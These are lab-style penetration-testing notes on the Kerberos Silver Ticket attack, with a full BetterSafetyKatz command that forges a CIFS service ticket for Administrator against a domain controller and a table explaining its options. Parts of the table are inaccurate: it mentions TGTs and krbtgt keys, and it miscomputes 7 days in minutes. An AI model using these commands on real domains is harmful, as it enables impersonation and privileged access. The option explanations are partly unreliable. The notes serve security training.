# Silver Ticket

Silver ticket is signed and encrypted by the hash of **service** account which makes it a valid **TGS** ticket.

## Create The Ticket

```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden 
/User:Administrator /domain:dollarcorp.moneycorp.local
/sid:S-1-5-21-719815819-3726368948-3917688648 
/target:dcorp-dc.dollarcorp.moneycorp.local
/service:CIFS /rc4:e9bb4c3d1327e29093dfecab8c2676f6 
/startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

<table><thead><tr><th width="318">Options</th><th width="431"></th></tr></thead><tbody><tr><td>kerberos::golden</td><td>Name of the module</td></tr><tr><td>/User:Administrator</td><td>Username for which the TGT is generated</td></tr><tr><td>/domain:</td><td>Domain FQDN</td></tr><tr><td>/sid:</td><td>SID of the domain</td></tr><tr><td>/target:</td><td>Target server FQDN</td></tr><tr><td>/service:</td><td>The SPN name of service for which TGS is to be created</td></tr><tr><td>/aes256:</td><td>AES256 keys of the krbtgt account</td></tr><tr><td>/id:500 /groups:512</td><td>Optional User and Group RID</td></tr><tr><td>/ptt</td><td>ptt: inject ticket to current process</td></tr><tr><td>/startoffset:0</td><td>Optional when the ticket is available in minutes. <br>Use negative for a ticket available from past and a larger number for future.</td></tr><tr><td>/endin:600</td><td>Optional ticket lifetime in minutes.  (default <strong>10</strong> years)<br>The default AD setting is 10 hours = 600 minutes</td></tr><tr><td>/renewmax:10080</td><td>Optional ticket lifetime with renewal in minutes. (default is <strong>10</strong> years)<br>The default AD setting is 7 days = 100800</td></tr></tbody></table>
